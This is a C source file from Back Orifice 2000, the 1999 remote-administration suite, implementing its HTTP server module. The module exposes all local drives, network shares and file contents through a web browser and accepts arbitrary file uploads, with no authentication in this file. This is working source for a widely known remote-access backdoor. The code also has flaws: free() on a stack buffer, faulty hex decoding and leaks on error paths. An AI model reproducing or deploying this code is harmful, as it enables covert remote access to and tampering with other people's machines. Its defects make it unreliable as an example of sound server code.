/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<osversion.h>
#include<iohandler.h>
#include<functions.h>
#include<cmd\cmd_tcpip.h>
#include<pviewer.h>
#include<strhandle.h>

//typedef struct __port_child_param {
//	SOCKET s;
//	SOCKADDR_IN saddr;
//	BOOL *pbDone;
//	int nArg1;
//	char *svArg2;
//	char *svArg3;
//} PORT_CHILD_PARAM;

#pragma pack(push,1)
typedef struct {
	DWORD LowPart;
	DWORD HighPart;
} ULARGE_INT;
#pragma pack(pop)


static char *typehtml = "text/html";
static char *typetext =  "text/plain";
static char *typebinary = "application/octet-stream";
static char *typejpeg = "image/jpeg";
static char *typegif = "image/gif";
static char *dataerror = "Missing data";

typedef enum {
	FOLDER,
	FILE,
	EXE,
	IMAGE,
	HTML,
	TEXT,
	COMPUTER,
	DRIVE,
	CDROM,
	REMOTE,
	ENTIRENETWORK,
	NETWORK,
	DOMAIN,
	SERVER,
	PRINTER
} GIFICON;

char *GetMimeType(char *filename)
{
	char *ptr;
	
	ptr=strrchr(filename, '.');
	if(ptr==NULL) return typebinary;	
	ptr++;
	
	if(lstrcmpi(ptr,"gif")==0) return typegif;
	if(lstrcmpi(ptr,"jpg")==0 || lstrcmpi(ptr,"jpeg")==0) return typejpeg;	
	if(lstrcmpi(ptr,"htm")==0 || lstrcmpi(ptr,"html")==0) return typehtml;
	
	if(lstrcmpi(ptr,"c")==0 || lstrcmpi(ptr,"cpp")==0 || lstrcmpi(ptr,"txt")==0 || 
	   lstrcmpi(ptr,"diz")==0 || lstrcmpi(ptr,"h")==0 || lstrcmpi(ptr,"bat")==0
	   || lstrcmpi(ptr,"ini")==0 || lstrcmpi(ptr,"reg")==0) return typetext;
	
	return typebinary;
}

GIFICON GetFileIcon(char *filename)
{
	char *ptr;
	
	ptr=strrchr(filename, '.');
	if(ptr==NULL) return FILE;	
	ptr++;
	
	if(lstrcmpi(ptr,"gif")==0 ||
	   lstrcmpi(ptr,"jpg")==0 || lstrcmpi(ptr,"jpeg")==0 ||
	   lstrcmpi(ptr,"bmp")==0) return IMAGE;
	
	if(lstrcmpi(ptr,"exe")==0 || lstrcmpi(ptr,"com")==0 || 
	   lstrcmpi(ptr,"sys")==0 || lstrcmpi(ptr,"vxd")==0 ||
	   lstrcmpi(ptr,"dll")==0 || lstrcmpi(ptr,"cpl")==0) return EXE;
	
	if(lstrcmpi(ptr,"htm")==0 || lstrcmpi(ptr,"html")==0) return HTML;
	
	if(lstrcmpi(ptr,"c")==0 || lstrcmpi(ptr,"cpp")==0 || lstrcmpi(ptr,"txt")==0 || 
	   lstrcmpi(ptr,"diz")==0 || lstrcmpi(ptr,"h")==0 || lstrcmpi(ptr,"bat")==0
	   || lstrcmpi(ptr,"ini")==0 || lstrcmpi(ptr,"reg")==0) return TEXT;
	
	return FILE;
}


void FormatTime(char *buff, SYSTEMTIME thetime)
{
	char *weekday, *month;
	
	switch (thetime.wDayOfWeek) {
	case 0: weekday = "Sun"; break;
	case 1: weekday = "Mon"; break;
	case 2: weekday = "Tue"; break;
	case 3: weekday = "Wed"; break;
	case 4: weekday = "Thu"; break;
	case 5: weekday = "Fri"; break;
	case 6: weekday = "Sat"; break;
	default: weekday = "???"; break;
	}
	
	switch (thetime.wMonth)
	{
	case 1: month = "Jan"; break;
	case 2: month = "Feb"; break;
	case 3: month = "Mar"; break;
	case 4: month = "Apr"; break;
	case 5: month = "May"; break;
	case 6: month = "Jun"; break;
	case 7: month = "Jul"; break;
	case 8: month = "Aug"; break;
	case 9:	month = "Sep"; break;
	case 10: month = "Oct"; break;
	case 11: month = "Nov"; break;
	case 12: month = "Dec";	break;
	default: month = "???"; break;
	}
	
	wsprintf(buff, "%s, %02d %s %d %02d:%02d:%02d GMT", weekday, thetime.wDay, month, thetime.wYear, thetime.wHour, thetime.wMinute, thetime.wSecond);
}

void FormatHttpHeader(char *buff, int val, char *contenttype, char *svOther)
{
	char date[256];
	char *errtxt;
	SYSTEMTIME curtime;
	
	switch (val) {
	case 200: errtxt = "OK"; break;
	case 201: errtxt = "Created"; break;
	case 202: errtxt = "Accepted"; break;
	case 204: errtxt = "No Content"; break;
	case 300: errtxt = "Multiple Choices"; break;
	case 301: errtxt = "Moved Permanently"; break;
	case 302: errtxt = "Moved Temporarily"; break;
	case 304: errtxt = "Not modified"; break;
	case 400: errtxt = "Bad Request"; break;
	case 401: errtxt = "Unauthorized"; break;
	case 403: errtxt = "Forbidden"; break;
	case 404: errtxt = "Not Found"; break;
	case 500: errtxt = "Internal Server Error"; break;
	case 501: errtxt = "Not Implemented"; break;
	case 502: errtxt = "Bad Gateway"; break;
	case 503: errtxt = "Service Unavailable"; break;
	default: errtxt = ""; break;
	}
	
	GetSystemTime(&curtime);
	FormatTime(date, curtime);
	
	wsprintf(buff, "HTTP/1.1 %d %s\r\nServer: BO2K/0.9\r\nDate: %s\r\nContent-type: %s\r\nPublic: GET, POST\r\n%s\r\n", val, errtxt, date, contenttype,svOther);
}

void HTTPEnumRes(SOCKET s, NETRESOURCE *pNetContainer, DWORD dwScope)
{
	char svBuffer[2048];
	int i;

	// Open network resource list
	HANDLE hNet;
	if (pWNetOpenEnum(dwScope,RESOURCETYPE_ANY,0,pNetContainer,&hNet)!=NO_ERROR) return;
	
	// Enumerate resources
	int ret;
	DWORD dwCount,dwBufSize;
	NETRESOURCE *pNetRes;
	pNetRes=(NETRESOURCE *)malloc(16384);
	if(pNetRes==NULL) {
		pWNetCloseEnum(hNet);
		return;
	}
	
	dwCount=1;
	dwBufSize=16384;
	ret=pWNetEnumResource(hNet,&dwCount,pNetRes,&dwBufSize);
	while(ret!=ERROR_NO_MORE_ITEMS) {
		// Give up time
		Sleep(20);

		char *svType,*svLocalName,*svRemoteName,*svComment;
		GIFICON icon;

		char svURLHead[MAX_PATH+1];
		char svURLFoot[MAX_PATH+1];
		svURLHead[0]='\0';
		svURLFoot[0]='\0';

		switch(pNetRes->dwDisplayType) {
		case RESOURCEDISPLAYTYPE_DOMAIN:
			icon=DOMAIN;
			break;
		case RESOURCEDISPLAYTYPE_GENERIC:
			icon=SERVER;
			break;
		case RESOURCEDISPLAYTYPE_SERVER:
			icon=SERVER;
			break;
		case RESOURCEDISPLAYTYPE_SHARE:			
			switch(pNetRes->dwType) {
			case RESOURCETYPE_DISK:
				wsprintf(svURLHead,"<a href=\"%s/\">",pNetRes->lpRemoteName+2);
				for(i=lstrlen(svURLHead)-1;i>=0;i--) 
					if(svURLHead[i]=='\\') svURLHead[i]='/';
					wsprintf(svURLFoot,"</a>");
				icon=FOLDER;
				break;
			case RESOURCETYPE_PRINT:
				icon=PRINTER;
				break;
			default:
				svType="";
				break;
			}
			break;
		default:
			icon=NETWORK;
			break;
		}
		
		if(pNetRes->lpLocalName==NULL) svLocalName="";
		else svLocalName=pNetRes->lpLocalName;

		if(pNetRes->lpRemoteName==NULL) svRemoteName="";
		else svRemoteName=pNetRes->lpRemoteName;
		
		if(pNetRes->lpComment==NULL) svComment="";
		else svComment=pNetRes->lpComment;
		
		if(!pNetRes->lpLocalName && !pNetRes->lpRemoteName) {
			wsprintf(svBuffer,"<img src=\"/?image=%u\">&nbsp;%s<br>\r\n", icon, svComment);
		} else {
			wsprintf(svBuffer,"<img src=\"/?image=%u\">&nbsp;%s%s%s <b>%s</b> <i>%s</i><br>\r\n", icon, svURLHead,svRemoteName, svURLFoot, svLocalName, svComment);
		}
		send(s,svBuffer,lstrlen(svBuffer),0);
		
		// Recurse if necessary
		if (pNetRes->dwUsage & RESOURCEUSAGE_CONTAINER && dwScope == RESOURCE_GLOBALNET) {
			wsprintf(svBuffer,"<ul>");
			send(s,svBuffer,lstrlen(svBuffer),0);
			HTTPEnumRes(s,pNetRes,dwScope);
			wsprintf(svBuffer,"</ul>");
			send(s,svBuffer,lstrlen(svBuffer),0);
		}
		
		dwCount=1;
		dwBufSize=16384;
		ret=pWNetEnumResource(hNet,&dwCount,pNetRes,&dwBufSize);
	}
	free(pNetRes);
	pWNetCloseEnum(hNet);
}






void HTTPHandleFile(SOCKET s, char *svReqType, char *svFullPath, char *svKnownPath, int nHTTPVersion)
{
	char svBuffer[1024];
	int i,j;
			
	if(lstrcmp(svFullPath,"\\")==0) {
		// Display computer name
		
		DWORD dwBufSize = MAX_COMPUTERNAME_LENGTH+1;
		char svComputerName[MAX_COMPUTERNAME_LENGTH+1];
		if(GetComputerName(svComputerName, &dwBufSize)==FALSE) {
			return;
		}

		// Issue headers and start of html
		FormatHttpHeader(svBuffer,200,typehtml,"");
		send(s,svBuffer,lstrlen(svBuffer),0);

		// Put computer name header
		GIFICON icon;
		icon=COMPUTER;
		wsprintf(svBuffer,"<html>\r\n<head><title>%s</title></head>\r\n<body bgcolor=#FFFFFF text=#000000>\r\n"
			              "<h1><img align=absbottom src=/?image=%u>&nbsp;%s</h1>\r\n<ul><pre>\r\n",
						  svComputerName, icon, svComputerName);
		send(s,svBuffer,lstrlen(svBuffer),0);

		// List all drives
		char c;
		int x;
		for (c = 'C'; c <= 'Z'; c++) {
			char *svDesc;
			char svDesc2[512];
			wsprintf(svBuffer,"%c:\\",c);
			x = GetDriveType(svBuffer);
			switch (x) {
			case 0:
				icon=DRIVE;
				svDesc="Unable to determine";
				break;
			case 1:
				break;
			case DRIVE_REMOVABLE:
				icon=DRIVE;
				svDesc="Removable";
				break;
			case DRIVE_FIXED:
				icon=DRIVE;
				
				DWORD spc,bps,nfc,tnc,dwFree,dwTotal;
				
				if (GetDiskFreeSpace(svBuffer,&spc,&bps,&nfc,&tnc)) {
					dwFree=(nfc*((bps*spc)/1024));
					dwTotal=(tnc*((bps*spc)/1024));

					char fc,tc;
					
					tc='K';
					if(dwTotal>1024) {
						dwTotal>>=10;
						tc='M';
					}

					fc='K';
					if(dwFree>1024) {
						dwFree>>=10;
						fc='M';
					}

					wsprintf(svDesc2, "Fixed    Bytes free: %u%c/%u%c", dwFree, fc, dwTotal, tc);
					svDesc=svDesc2;
				} else svDesc="Fixed";
				break;
			case DRIVE_REMOTE:
				icon=REMOTE;
				svDesc="Remote";
				break;
			case DRIVE_CDROM:
				icon=CDROM;
				svDesc="CDROM";
				break;
			case DRIVE_RAMDISK:
				icon=DRIVE;
				svDesc="Ramdisk";
				break;
			default:
				icon=DRIVE;
				svDesc="Unknown";
				break;
			}
			if(x!=1) {
				wsprintf(svBuffer,"<img align=absbottom src=/?image=%u><a href=/%%DRIVE%%%c:/>%c:\\</a>   %s\r\n",
					icon,c,c,svDesc);
				send(s,svBuffer,lstrlen(svBuffer),0);
			}
		}
		
		// Issue Link to Network Neighborhood
		wsprintf(svBuffer,"\r\n<h2><a href=\"/%%NETHOOD%%/\">Network Neighborhood</a></h2>\r\n");
		send(s,svBuffer,lstrlen(svBuffer),0);

		// Issue HTML footers
		wsprintf(svBuffer,"</pre></ul>\r\n</body>\r\n</html>\r\n");
		send(s,svBuffer,lstrlen(svBuffer),0);

	}
	else if(lstrcmp(svFullPath,"\\\\")==0) {
		// Issue headers and start of html
		FormatHttpHeader(svBuffer,200,typehtml,"");
		send(s,svBuffer,lstrlen(svBuffer),0);

		// Put title
		wsprintf(svBuffer,"<html>\r\n<head><title>Network Neighborhood</title></head>\r\n<body bgcolor=#FFFFFF text=#000000>\r\n"
			              "<h1><img src=\"/?image=%u\">&nbsp;Entire Network</h1>\r\n<ul>\r\n",(GIFICON)ENTIRENETWORK);
		send(s,svBuffer,lstrlen(svBuffer),0);

		HTTPEnumRes(s,NULL,RESOURCE_GLOBALNET);
				
		// Issue HTML footers
		wsprintf(svBuffer,"</ul>\r\n</body>\r\n</html>\r\n");
		send(s,svBuffer,lstrlen(svBuffer),0);

	} else {
		DWORD dwFileAttr;
		dwFileAttr=GetFileAttributes(svFullPath);
		if(dwFileAttr==-1) dwFileAttr=FILE_ATTRIBUTE_DIRECTORY;

		if(dwFileAttr & FILE_ATTRIBUTE_DIRECTORY) {

			// Handle directory listing
			WIN32_FIND_DATA w32fd;
			char svWildCard[MAX_PATH+2];

			lstrcpyn(svWildCard,svFullPath,MAX_PATH);
			lstrcat(svWildCard,"*");

			// Get file listing	
			HANDLE fh;
			int nFileCount=0;
			fh=FindFirstFile(svWildCard,&w32fd);
			if(fh==INVALID_HANDLE_VALUE) return;
			do {
				nFileCount++;
			} while(FindNextFile(fh,&w32fd));
			FindClose(fh);
			
			WIN32_FIND_DATA *pFileArray=(WIN32_FIND_DATA *)malloc(sizeof(WIN32_FIND_DATA)*nFileCount);
			if(pFileArray==NULL) return;
			
			fh=FindFirstFile(svWildCard,pFileArray);
			if(fh==INVALID_HANDLE_VALUE) return;
			for(i=1;i<nFileCount;i++) {	
				FindNextFile(fh,pFileArray+i);
			}
			FindClose(fh);
			
			// Sort file listing
			WIN32_FIND_DATA tmp;
			for(i=0;i<nFileCount;i++) {
				for(j=i+1;j<nFileCount;j++) {
					if(pFileArray[i].dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
						if(pFileArray[j].dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
							if(lstrcmpi(pFileArray[i].cFileName,pFileArray[j].cFileName)>0) {
								tmp=pFileArray[i]; pFileArray[i]=pFileArray[j]; pFileArray[j]=tmp;
							}
						}
					} else {
						if(pFileArray[j].dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
							tmp=pFileArray[i]; pFileArray[i]=pFileArray[j]; pFileArray[j]=tmp;
						} else {
							if(lstrcmpi(pFileArray[i].cFileName,pFileArray[j].cFileName)>0) {
								tmp=pFileArray[i]; pFileArray[i]=pFileArray[j]; pFileArray[j]=tmp;
							}
						}
					}
					
				}
			}

			// Issue headers and start of html
			FormatHttpHeader(svBuffer,200,typehtml,"");
			send(s,svBuffer,lstrlen(svBuffer),0);
			
			wsprintf(svBuffer,"<html>\r\n<head><title>%s</title></head>\r\n<body bgcolor=#FFFFFF text=#000000>\r\n"
				              "<h1>Directory: %s</h1>\r\n<ul><pre>\r\n",svKnownPath,svKnownPath);
			send(s,svBuffer,lstrlen(svBuffer),0);

			// Output table header
			wsprintf(svBuffer,"<b><u>   Date      Time         Size    Filename                                </u></b>\r\n");
			send(s,svBuffer,lstrlen(svBuffer),0);

			DWORD dwBytesTotal;
			DWORD dwDirCount;
			DWORD dwFileCount;
			
			dwFileCount=0;
			dwBytesTotal=0;
			dwDirCount=0;

			for(i=0;i<nFileCount;i++) {
				SYSTEMTIME sysTime;
				GIFICON icon;
					
				FileTimeToSystemTime(&(pFileArray[i].ftLastWriteTime),&sysTime);
				if(pFileArray[i].dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
					icon=FOLDER;
					wsprintf(svBuffer,"%2.2u-%2.2u-%4.4u  %2.2u:%2.2u        &lt;DIR&gt;  <img src=/?image=%u align=absbottom border=0><a href=\"%s/\">%-.64s\\</a>\r\n",
						sysTime.wMonth,sysTime.wDay,sysTime.wYear,
						sysTime.wHour,sysTime.wMinute,
						icon,
						pFileArray[i].cFileName,
						pFileArray[i].cFileName);
					send(s,svBuffer,lstrlen(svBuffer),0);
					dwDirCount++;
				} else {
					icon=GetFileIcon(pFileArray[i].cFileName);
					wsprintf(svBuffer,"%2.2u-%2.2u-%4.4u  %2.2u:%2.2u  %11u  <img src=/?image=%u align=absbottom border=0><a href=\"%s\">%-.64s</a>\r\n",
						sysTime.wMonth,sysTime.wDay,sysTime.wYear,
						sysTime.wHour,sysTime.wMinute,
						pFileArray[i].nFileSizeLow,
						icon,
						pFileArray[i].cFileName,
						pFileArray[i].cFileName);
					send(s,svBuffer,lstrlen(svBuffer),0);
					dwBytesTotal+=pFileArray[i].nFileSizeLow;
					dwFileCount++;
				}				
			}
			free(pFileArray);
			
			// Report byte count

			wsprintf(svBuffer, "</pre><tt>%u Bytes, %u Files, %u Folders</tt><P>", dwBytesTotal,dwFileCount,dwDirCount);
			send(s, svBuffer, lstrlen(svBuffer), 0);
									
			// Issue HTTP Upload form
			wsprintf(svBuffer, "<FORM ENCTYPE=\"multipart/form-data\" ACTION= \"?upload\" METHOD=\"POST\"><P><INPUT TYPE=\"SUBMIT\" VALUE=\"Upload File:\"> <INPUT TYPE=\"file\" NAME=\"filename\"></FORM>");
			send(s, svBuffer, lstrlen(svBuffer), 0);

			// Issue HTML footers
			wsprintf(svBuffer,"</pre></ul>\r\n</body>\r\n</html>\r\n");
			send(s,svBuffer,lstrlen(svBuffer),0);

		} else {
			
			// ---- File ---- 

			// Get Mime Type
			char *svMime;
			svMime=GetMimeType(svFullPath);
		
			// Open File
			HANDLE hFile;
			hFile=CreateFile(svFullPath,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_FLAG_SEQUENTIAL_SCAN,NULL);
			if(hFile==INVALID_HANDLE_VALUE) {
				FormatHttpHeader(svBuffer,404,typehtml,"");
				send(s,svBuffer,lstrlen(svBuffer),0);
				return;
			}

			// Allocate copy buffer
			char *pBuffer;
			pBuffer=(char *)malloc(1024);
			if(pBuffer==NULL) {
				FormatHttpHeader(svBuffer,500,typehtml,"");
				send(s,svBuffer,lstrlen(svBuffer),0);
				return;
			}
			
			// Issue headers
			char svTimeBuf[256];
			char svHeadBuf[512];
			SYSTEMTIME sysTime;
			GetSystemTime(&sysTime);
			FormatTime(svTimeBuf, sysTime);
			int nLength;
			nLength=GetFileSize(hFile,NULL);
            wsprintf(svHeadBuf, "Last-modified: %s\r\nContent-length: %d\r\nAccept-ranges: bytes\r\nConnection: keep-alive\r\n", svTimeBuf, nLength);
            FormatHttpHeader(svBuffer,200,svMime,svHeadBuf);
			send(s,svBuffer,lstrlen(svBuffer),0);
			                    
			// Send file
			DWORD dwBytes,dwCount;
			dwCount=0;
			do {
				if(ReadFile(hFile,pBuffer,1024,&dwBytes,NULL)) {
					if(dwBytes!=0) {
						send(s,pBuffer,dwBytes,0);
						dwCount+=dwBytes;
					}
				}
				else break;
			} while(dwBytes!=0);

			// Clean up
			free(pBuffer);
			CloseHandle(hFile);
		}
	}
}

extern unsigned int pGifFILE_LEN;
extern unsigned char pGifFILE_DATA[];
extern unsigned int pGifFOLDER_LEN;
extern unsigned char pGifFOLDER_DATA[];
extern unsigned int pGifEXE_LEN;
extern unsigned char pGifEXE_DATA[];
extern unsigned int pGifIMAGE_LEN;
extern unsigned char pGifIMAGE_DATA[];
extern unsigned int pGifHTML_LEN;
extern unsigned char pGifHTML_DATA[];
extern unsigned int pGifTEXT_LEN;
extern unsigned char pGifTEXT_DATA[];
extern unsigned int pGifDRIVE_LEN;
extern unsigned char pGifDRIVE_DATA[];
extern unsigned int pGifREMOTE_LEN;
extern unsigned char pGifREMOTE_DATA[];
extern unsigned int pGifCDROM_LEN;
extern unsigned char pGifCDROM_DATA[];
extern unsigned int pGifCOMPUTER_LEN;
extern unsigned char pGifCOMPUTER_DATA[];
extern unsigned int pGifENTIRENETWORK_LEN;
extern unsigned char pGifENTIRENETWORK_DATA[];
extern unsigned int pGifNETWORK_LEN;
extern unsigned char pGifNETWORK_DATA[];
extern unsigned int pGifDOMAIN_LEN;
extern unsigned char pGifDOMAIN_DATA[];
extern unsigned int pGifSERVER_LEN;
extern unsigned char pGifSERVER_DATA[];
extern unsigned int pGifPRINTER_LEN;
extern unsigned char pGifPRINTER_DATA[];


void HTTPHandleImage(SOCKET s, char *svReqType, GIFICON nImage, int nHTTPVersion)
{
	char svBuffer[512];
	
	// Send a gif
	FormatHttpHeader(svBuffer,200,typegif,"");
	send(s,svBuffer,lstrlen(svBuffer),0);

	switch(nImage) {
	case FOLDER:
		send(s,(char *)pGifFOLDER_DATA,pGifFOLDER_LEN,0);
		break;
	case FILE:
		send(s,(char *)pGifFILE_DATA,pGifFILE_LEN,0);
		break;
	case EXE:
		send(s,(char *)pGifEXE_DATA,pGifEXE_LEN,0);
		break;
	case IMAGE:
		send(s,(char *)pGifIMAGE_DATA,pGifIMAGE_LEN,0);
		break;
	case HTML:
		send(s,(char *)pGifHTML_DATA,pGifHTML_LEN,0);
		break;
	case TEXT:
		send(s,(char *)pGifTEXT_DATA,pGifTEXT_LEN,0);
		break;
	case COMPUTER:
		send(s,(char *)pGifCOMPUTER_DATA,pGifCOMPUTER_LEN,0);
		break;
	case DRIVE:
		send(s,(char *)pGifDRIVE_DATA,pGifDRIVE_LEN,0);
		break;
	case CDROM:
		send(s,(char *)pGifCDROM_DATA,pGifCDROM_LEN,0);
		break;
	case REMOTE:
		send(s,(char *)pGifREMOTE_DATA,pGifREMOTE_LEN,0);
		break;
	
	case ENTIRENETWORK:
		send(s,(char *)pGifENTIRENETWORK_DATA,pGifENTIRENETWORK_LEN,0);
		break;
	case NETWORK:
		send(s,(char *)pGifNETWORK_DATA,pGifNETWORK_LEN,0);
		break;
	case DOMAIN:
		send(s,(char *)pGifDOMAIN_DATA,pGifDOMAIN_LEN,0);
		break;
	case SERVER:
		send(s,(char *)pGifSERVER_DATA,pGifSERVER_LEN,0);
		break;
	case PRINTER:
		send(s,(char *)pGifPRINTER_DATA,pGifPRINTER_LEN,0);
		break;
	
	default:
		return;
	}

	return;
}	


DWORD WINAPI PortHTTPThread(LPVOID lpParameter)
{
	PORT_CHILD_PARAM *ppcp=(PORT_CHILD_PARAM *) lpParameter;

	// Send Keep-Alives (browser usually wants them) and set blocking mode
	BOOL bKeepAlive=TRUE;
	setsockopt(ppcp->s,SOL_SOCKET,SO_KEEPALIVE,(char *)&bKeepAlive,sizeof(BOOL));
	DWORD dwNonBlock=FALSE;
	ioctlsocket(ppcp->s,FIONBIO,&dwNonBlock);

	// Read in the HTTP request
	DWORD dwLen;
	char *svBuffer;
	do {
		Sleep(20);
		ioctlsocket(ppcp->s,FIONREAD,&dwLen);
	} while(dwLen==0);

	svBuffer=(char *) malloc(dwLen+1);
	if(svBuffer==NULL) {
		closesocket(ppcp->s);
		free(ppcp);
		return 1;
	}
	if(recv(ppcp->s,svBuffer,dwLen,0) <= 0) return -1;
	svBuffer[dwLen]='\0';

	// Determine request type
	char *svNext,*svReqType;
	svReqType=svBuffer;
	svNext=BreakString(svReqType," ");
	if(svNext==NULL) {
		free(svBuffer);
		closesocket(ppcp->s);
		free(ppcp);
		return 1;
	}

	// Retrieve path
	char *svPath;
	svPath=svNext;
	svNext=BreakString(svPath,"\r\n");
	if(svNext==NULL) {
		free(svBuffer);
		closesocket(ppcp->s);
		free(ppcp);
		return 1;
	}
	
	// Strip off and retrieve HTTP type
	int len,i;
	int nHTTPVersion;
	len=lstrlen(svPath);
	for(i=len-1;i>=0;i--) {
		if(lstrcmp(svPath+i," HTTP/1.0")==0) { nHTTPVersion=10; break; }
		if(lstrcmp(svPath+i," HTTP/0.9")==0) { nHTTPVersion=9; break; }
		if(lstrcmp(svPath+i," HTTP/1.1")==0) { nHTTPVersion=11; break; }
	}
	if(i==0) {
		free(svBuffer);
		closesocket(ppcp->s);
		free(ppcp);
		return 1;
	}
	svPath[i]='\0';
	
	// Strip off file option string
	char *svOptions;
	svOptions=BreakString(svPath,"?");
	
	// Strip trailing [back]slash from root pathname
	char svDiskPath[MAX_PATH+1];
	int nDPLen;
	lstrcpyn(svDiskPath,ppcp->svArg2,MAX_PATH+1);
	nDPLen=lstrlen(svDiskPath);
	if(svDiskPath[nDPLen-1]=='/' || svDiskPath[nDPLen-1]=='\\') {
		svDiskPath[nDPLen-1]='\0';
		nDPLen--;
	}
	
	// Get target disk path filename
	lstrcpyn(svDiskPath+nDPLen,svPath,(MAX_PATH+1)-nDPLen);
	nDPLen=lstrlen(svDiskPath);
	
	// Convert everything to backslashes
	for(i=0;i<nDPLen;i++) {
		if(svDiskPath[i]=='/') svDiskPath[i]='\\';
	}
	
	// Convert "%" values
	for(i=0;i<(nDPLen-2);i++) {
		if(svDiskPath[i]=='%') {
			if(strncmp(svDiskPath+i,"%DRIVE%",7)==0) {
				lstrcpy(svDiskPath,svDiskPath+i+7);
				nDPLen-=(i+7);
				i=0;
			}
			else if(strncmp(svDiskPath+i,"%NETHOOD%",9)==0) {
				lstrcpy(svDiskPath+i,svDiskPath+i+9);
				nDPLen-=9;
			} else {
				char d,c;
				d=svDiskPath[i+1];
				if(d>='A' && d<='F') c=(d-'A')<<4;
				if(d>='a' && d<='f') c=(d-'a')<<4;
				if(d>='0' && d<='9') c=(d-'0')<<4;
				d=svDiskPath[i+2];
				if(d>='A' && d<='F') c|=d-'A';
				if(d>='a' && d<='f') c|=d-'a';
				if(d>='0' && d<='9') c|=d-'0';
				
				lstrcpy(svDiskPath+i+1,svDiskPath+i+3);
				
				svDiskPath[i]=c;
				nDPLen-=2;
			}
		}
	}
	
	// Get Full Path in proper format
	DWORD nFullPathLen;
	char svFullPath[MAX_PATH+1], *svFilePart,*svKnownPath;
	
	
	// Get rid of double slashes if we're not at the root
	if(ppcp->svArg2[0]!=0) {
		nFullPathLen=GetFullPathName(svDiskPath,MAX_PATH+1,svFullPath,&svFilePart);
		if(BreakString(svFullPath,"\\\\")!=NULL) {
			free(svFullPath);
			free(svBuffer);
			closesocket(ppcp->s);
			free(ppcp);
			return 1;
		}
	} else {
		lstrcpyn(svFullPath,svDiskPath,MAX_PATH+1);
	}

	
	// Verify root
	DWORD nRootPathLen;
	nRootPathLen=lstrlen(ppcp->svArg2);
	if(nRootPathLen>nFullPathLen) {
		free(svFullPath);
		free(svBuffer);
		closesocket(ppcp->s);
		free(ppcp);
		return 1;
	}
	if(CompareString(LOCALE_SYSTEM_DEFAULT,NORM_IGNORECASE,ppcp->svArg2,nRootPathLen,svFullPath,nRootPathLen)!=CSTR_EQUAL) {
		free(svFullPath);
		free(svBuffer);
		closesocket(ppcp->s);
		free(ppcp);
		return 1;
	}
	svKnownPath=svFullPath+nRootPathLen;
	

	if(lstrcmpi(svReqType,"GET")==0) {
		// GET request		
		
		
		// Serve up appropriate file
		
		if(svOptions==NULL) {
			HTTPHandleFile(ppcp->s,svReqType,svFullPath,svKnownPath,nHTTPVersion);	
		} else {
			char svImage[7];
			lstrcpyn(svImage,svOptions,7);
			if(lstrcmpi(svImage,"image=")==0) {
				HTTPHandleImage(ppcp->s,svReqType,(GIFICON)atoi(svOptions+6),nHTTPVersion);
			}
		}
		
		// Exit cleanly
		//if(svFullPath) free(svFullPath);
	}
	else if(lstrcmpi(svReqType,"POST")==0) {
		// POST request
		
		// Get boundary separator
		char *svBoundary;
		svBoundary=BreakString(svNext,"boundary=");
		svNext=BreakString(svBoundary,"\r\n");
		
		// Get content length
		char *svContentLen;
		int nContentLen;
		svContentLen=BreakString(svNext,"Content-Length: ");
		svNext=BreakString(svContentLen,"\r\n");
		nContentLen=atoi(svContentLen);

		// Get start of form data
		char *svForm;
		svForm=BreakString(svNext,svBoundary);
		
		// Get upload file name
		char *svUploadName, *ptr;
		svUploadName=BreakString(svForm,"filename=\"");
		svNext=BreakString(svUploadName,"\"");
		if((ptr=strrchr(svUploadName,'\\'))!=NULL) {
			svUploadName=(ptr+1);
		}

		// Get Start of data
		char *pStartData;
		pStartData=BreakString(svNext,"\r\n\r\n");
		
		// Create file pathname
		HANDLE hFile;
		char svFilePath[MAX_PATH+1];
		lstrcpyn(svFilePath,svFullPath,MAX_PATH+1);
		lstrcpyn(svFilePath+lstrlen(svFilePath),svUploadName,(MAX_PATH+1)-lstrlen(svFilePath));

		// Open file
		hFile=CreateFile(svFilePath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
		if(hFile!=INVALID_HANDLE_VALUE) {
			// Write what we have to the file
			DWORD dwFileLen;
			dwFileLen=nContentLen-((DWORD)pStartData-(DWORD)svForm)-((lstrlen(svBoundary)+2)*2)-6;
			
			DWORD dwCount,dwBytes;
			dwCount=dwLen-(((DWORD)pStartData)-((DWORD)svBuffer));
			if(dwCount>dwFileLen) dwCount=dwFileLen;

			WriteFile(hFile,pStartData,dwCount,&dwBytes,NULL);
			
			// Loop reading in the rest
			char *pInBuf=(char *)malloc(1024);
			if(pInBuf!=NULL) {
				int nBytes;
				dwBytes=dwFileLen-dwCount;
				while(dwBytes>0) {
					nBytes=recv(ppcp->s,pInBuf,1024,0);
					if(nBytes<=0) break;
					if(nBytes>(int)dwBytes) nBytes=dwBytes;

					WriteFile(hFile,pInBuf,nBytes,&dwCount,NULL);

					dwBytes-=dwCount;
				}
				
				FormatHttpHeader(svBuffer, 201, typehtml, "\r\n");
				send(ppcp->s, svBuffer, lstrlen(svBuffer), 0);
				wsprintf(svBuffer, "<html>\r\n<head>\r\n<title>File received</title>\r\n</head>\r\n"
					"<body bgcolor=#FFFFFF text=#000000>\r\n<h1>File successfully uploaded</h1>\r\n</body>\r\n</html>\r\n");
				send(ppcp->s, svBuffer, lstrlen(svBuffer), 0);
				
				free(pInBuf);
			}

			CloseHandle(hFile);
		}
		
	
	} 

	free(svBuffer);
	closesocket(ppcp->s);
	free(ppcp);
	return 0;
}
	







